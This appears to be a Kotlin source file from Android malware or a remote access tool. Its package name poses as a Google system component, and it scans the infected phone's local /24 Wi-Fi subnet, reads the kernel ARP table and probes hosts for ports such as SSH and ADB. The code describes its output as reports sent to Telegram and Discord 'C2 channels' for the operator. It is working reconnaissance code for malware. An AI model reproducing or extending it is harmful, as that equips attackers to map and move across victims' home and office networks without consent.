package com.google.android.system

import android.content.Context
import android.net.wifi.WifiManager
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.withContext
import java.io.File
import java.net.InetAddress
import java.net.InetSocketAddress
import java.net.NetworkInterface
import java.net.Socket
import java.util.Locale

/**
 * LocalNetworkDiscoveryEngine
 *
 * Multithreaded ARP / ICMP / TCP Local Subnet & Port Discovery Engine (FEAT-06):
 * - Maps local Wi-Fi /24 subnets (e.g. 192.168.1.0/24) using Kotlin Coroutines.
 * - Parses /proc/net/arp for hardware MAC address discovery.
 * - Probes diagnostic network ports (21, 22, 80, 443, 3389, 5555 ADB, 5467 WebStream, 8080).
 * - Formats ASCII network topology maps for Telegram (/) and Discord (!) C2 channels.
 */
object LocalNetworkDiscoveryEngine {

    private const val TAG = "LocalNetEngine"
    val DEFAULT_PORTS = listOf(21, 22, 80, 443, 3389, 5555, 5467, 8080)

    data class DiscoveredHost(
        val ip: String,
        val macAddress: String = "Unknown",
        val openPorts: List<Int> = emptyList(),
        val isGateway: Boolean = false,
        val isSelf: Boolean = false
    )

    data class SubnetScanReport(
        val localIp: String,
        val subnetPrefix: String,
        val totalScanned: Int,
        val activeHosts: List<DiscoveredHost>,
        val durationMs: Long
    )

    data class HostPortReport(
        val ip: String,
        val openPorts: List<Int>,
        val scannedPortCount: Int
    )

    /**
     * Resolves active local Wi-Fi IP address and /24 subnet prefix.
     */
    fun getLocalIpAndSubnet(context: Context): Pair<String, String> {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val ipInt = wifiManager?.connectionInfo?.ipAddress ?: 0

            if (ipInt != 0) {
                val ip = String.format(
                    Locale.US,
                    "%d.%d.%d.%d",
                    ipInt and 0xff,
                    ipInt shr 8 and 0xff,
                    ipInt shr 16 and 0xff,
                    ipInt shr 24 and 0xff
                )
                val prefix = ip.substringBeforeLast(".") + "."
                return Pair(ip, prefix)
            }

            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                if (iface.isLoopback || !iface.isUp) continue
                val addrs = iface.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        val ip = addr.hostAddress ?: ""
                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                            val prefix = ip.substringBeforeLast(".") + "."
                            return Pair(ip, prefix)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error resolving local IP: ${e.message}")
        }
        return Pair("127.0.0.1", "127.0.0.")
    }

    /**
     * Parses hardware MAC addresses from Linux kernel /proc/net/arp table.
     */
    fun parseArpTable(): Map<String, String> {
        val arpMap = mutableMapOf<String, String>()
        try {
            val arpFile = File("/proc/net/arp")
            if (arpFile.exists()) {
                arpFile.forEachLine { line ->
                    val parts = line.split(Regex("""\s+""")).filter { it.isNotBlank() }
                    if (parts.size >= 6 && parts[0] != "IP") {
                        val ip = parts[0]
                        val mac = parts[3]
                        if (mac != "00:00:00:00:00:00") {
                            arpMap[ip] = mac.uppercase(Locale.ROOT)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "parseArpTable warning: ${e.message}")
        }
        return arpMap
    }

    /**
     * Scans local /24 subnet asynchronously using Kotlin Coroutines.
     */
    suspend fun scanSubnet(context: Context): SubnetScanReport = withContext(Dispatchers.IO) {
        val startTime = System.currentTimeMillis()
        val (localIp, subnetPrefix) = getLocalIpAndSubnet(context)
        val arpMap = parseArpTable()
        val hosts = mutableListOf<DiscoveredHost>()

        val gatewayIp = "${subnetPrefix}1"

        // Asynchronously probe 1..254 host IPs
        val DeferredHosts = (1..254).map { hostNum ->
            async(Dispatchers.IO) {
                val targetIp = "$subnetPrefix$hostNum"
                val isSelf = targetIp == localIp
                val isGateway = targetIp == gatewayIp

                val openPorts = mutableListOf<Int>()
                val checkPorts = listOf(80, 443, 22, 5555, 5467)

                for (port in checkPorts) {
                    if (isPortOpen(targetIp, port, timeoutMs = 150)) {
                        openPorts.add(port)
                    }
                }

                val mac = arpMap[targetIp] ?: if (isSelf) "LOCAL DEVICE" else "Unknown"

                if (openPorts.isNotEmpty() || mac != "Unknown" || isSelf || isGateway) {
                    DiscoveredHost(
                        ip = targetIp,
                        macAddress = mac,
                        openPorts = openPorts,
                        isGateway = isGateway,
                        isSelf = isSelf
                    )
                } else null
            }
        }

        val results = DeferredHosts.awaitAll().filterNotNull()
        hosts.addAll(results)

        val duration = System.currentTimeMillis() - startTime
        return@withContext SubnetScanReport(
            localIp = localIp,
            subnetPrefix = subnetPrefix,
            totalScanned = 254,
            activeHosts = hosts,
            durationMs = duration
        )
    }

    /**
     * Scans open diagnostic ports for a specific target IP host.
     */
    suspend fun scanHostPorts(ip: String, ports: List<Int> = DEFAULT_PORTS): HostPortReport = withContext(Dispatchers.IO) {
        val openPorts = mutableListOf<Int>()

        val deferreds = ports.map { port ->
            async(Dispatchers.IO) {
                if (isPortOpen(ip, port, timeoutMs = 300)) {
                    port
                } else null
            }
        }

        val results = deferreds.awaitAll().filterNotNull()
        openPorts.addAll(results.sorted())

        return@withContext HostPortReport(
            ip = ip,
            openPorts = openPorts,
            scannedPortCount = ports.size
        )
    }

    /**
     * Helper to test if a specific TCP port is open.
     */
    private fun isPortOpen(ip: String, port: Int, timeoutMs: Int): Boolean {
        return try {
            Socket().use { socket ->
                socket.connect(InetSocketAddress(ip, port), timeoutMs)
                true
            }
        } catch (_: Exception) {
            false
        }
    }

    /**
     * Formats SubnetScanReport into clean ASCII markdown table for Discord/Telegram C2.
     */
    fun formatAsciiNetworkMap(report: SubnetScanReport): String {
        val sb = StringBuilder()
        sb.append("🌐 **Local Network Subnet Map (`${report.subnetPrefix}0/24`)**\n")
        sb.append("• **Local Device IP:** `${report.localIp}`\n")
        sb.append("• **Active Hosts Found:** `${report.activeHosts.size}`\n")
        sb.append("• **Scan Duration:** `${"%.2f".format(report.durationMs / 1000.0)}s`\n\n")

        sb.append("```\n")
        sb.append("%-16s %-18s %s\n".format("IP Address", "MAC Address", "Ports / Notes"))
        sb.append("─".repeat(50)).append("\n")

        for (host in report.activeHosts) {
            val portsStr = if (host.openPorts.isNotEmpty()) host.openPorts.joinToString(",") else "-"
            val note = when {
                host.isSelf -> " [This Device]"
                host.isGateway -> " [Gateway/Router]"
                else -> ""
            }
            sb.append("%-16s %-18s %s%s\n".format(host.ip, host.macAddress, portsStr, note))
        }
        sb.append("```")

        return sb.toString()
    }
}
